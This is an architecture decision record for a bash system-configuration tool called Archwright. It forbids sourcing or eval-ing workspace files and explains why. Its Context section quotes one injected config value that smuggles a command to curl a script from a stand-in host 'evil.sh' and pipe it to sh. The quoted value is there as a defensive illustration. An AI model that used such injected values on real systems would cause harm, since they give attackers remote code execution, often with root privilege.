# 0007 — Never `source` or `eval` anything from a workspace

**Status:** accepted, treated as a security invariant, not a preference

## Context

Archwright's entire job is to read a directory it doesn't control (a
workspace can be any private repo a user points it at) and act on the
local system, frequently as root (package installs, service enablement
both typically require privilege). The most direct way to parse a
`key=value`-shaped file in bash is to `source` it. That would also make it
trivially exploitable: a `profiles/evil.conf` containing
`` name=x`curl evil.sh | sh` `` would execute on `source`.

## Decision

Every workspace file the engine reads — `.archwright-version`,
`packages/*.txt`, `services/*.txt`, `profiles/*.conf` — is parsed with
`read`/`grep`/string-manipulation helpers in `lib/contract.sh` and
`lib/workspace.sh`. Nothing under a workspace directory is ever passed to
`source`, `eval`, `` ` ` ``, or `$()` as a command.

## Rationale

- The threat model explicitly includes "workspace repository compromised"
  (a plausible scenario: it's the thing people clone onto a fresh install,
  possibly from a fork or a copied example). A parser that cannot execute
  what it reads makes that scenario a data-integrity problem, not a code-
  execution one.
- This is exactly the reasoning that ruled out a `hook` role in this
  release (ADR 0012) — the two decisions are the same principle applied at
  different layers (parsing vs. an entire role category).

## Consequences

- Every new file format the engine needs to read must come with its own
  small hand-written parser, rather than reusing a generic "just source
  it" shortcut. This is the direct cost behind ADR 0003's choice of plain
  text over YAML/TOML too: a hand-rolled parser for a one-page grammar is a
  bounded cost; a hand-rolled *safe* YAML parser is not.
- Code review for any change touching `lib/workspace.sh` or `lib/roles/*.sh`
  should specifically check for `source`/`eval`/backtick usage on a
  workspace-derived path or value.
